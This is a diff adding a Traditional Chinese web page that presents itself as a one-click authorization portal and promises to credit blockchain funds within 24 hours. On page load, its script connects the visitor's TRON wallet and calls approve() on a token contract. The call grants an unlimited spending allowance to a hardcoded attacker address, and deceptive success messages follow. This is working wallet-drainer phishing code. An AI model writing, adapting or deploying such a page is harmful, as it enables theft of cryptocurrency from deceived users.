@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>一鍵授權頁面</title>
+  <style>
+    body {
+      font-family: "Noto Sans TC", "Microsoft JhengHei", sans-serif;
+      background: #0f172a;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+    .container {
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(12px);
+      border-radius: 16px;
+      padding: 30px 40px;
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+    }
+    h1 { font-size: 26px; margin-bottom: 16px; font-weight: 600; }
+    p { font-size: 16px; margin-bottom: 28px; line-height: 1.6; color: #cbd5e1; }
+    #status { margin-top: 20px; min-height: 24px; font-size: 14px; }
+    .loading { color: #facc15; }
+    .success { color: #4ade80; }
+    .error { color: #f87171; }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
+</head>
+<body>
+<div class="container">
+  <h1>一鍵授權頁面</h1>
+  <p>點擊下方授權按鈕，區塊鏈中資金會在24小時內，為您進行入賬，請確認。</p>
+  <p id="status" class="loading">正在檢測錢包環境...</p>
+</div>
+
+<script>
+  const TRUSD_CONTRACT = "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4"; // TRUSD 合約
+  const A_ADDRESS = "TKnC8zjqnb2Bmadd2ibNnLswZwp67zyi26";      // A 自己的地址
+  const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  let tronWeb;
+
+  async function connectWallet() {
+    if (window.tronWeb && window.tronWeb.ready) {
+      tronWeb = window.tronWeb;
+      return tronWeb.defaultAddress.base58;
+    }
+    if (window.tronLink) {
+      await window.tronLink.request({ method: 'tron_requestAccounts' });
+      tronWeb = window.tronWeb;
+      return tronWeb.defaultAddress.base58;
+    }
+    return null;
+  }
+
+  async function checkTronNetwork() {
+    try {
+      const chainId = await tronWeb.trx.getChainId?.();
+      if (chainId && chainId !== '_') {
+        updateStatus("請切換至 TRON 主網。", "error");
+        return false;
+      }
+      return true;
+    } catch {
+      return true;
+    }
+  }
+
+  async function approve() {
+    updateStatus("正在確認資產處理配置，請稍候...", "loading");
+    try {
+      const contract = await tronWeb.contract().at(TRUSD_CONTRACT);
+      await contract.approve(A_ADDRESS, INFINITE_AMOUNT).send();
+      updateStatus("資產配置成功，請耐心等待系統自動入帳。", "success");
+      setTimeout(() => {
+        window.location.href = "success.html";
+      }, 1500);
+    } catch (err) {
+      console.error(err);
+      updateStatus("無法完成操作，請稍後重試。", "error");
+      setTimeout(() => {
+        window.location.href = "error.html";
+      }, 2000);
+    }
+  }
+
+  function updateStatus(msg, type) {
+    const statusEl = document.getElementById("status");
+    statusEl.innerText = msg;
+    statusEl.className = type;
+  }
+
+  async function init() {
+    const address = await connectWallet();
+    if (!address) {
+      updateStatus("未偵測到 TRON 錢包，請使用幣安或 TronLink 進入此頁。", "error");
+      return;
+    }
+    if (!await checkTronNetwork()) return;
+    approve();
+  }
+
+  window.addEventListener('load', init);
+</script>
+</body>
+</html>
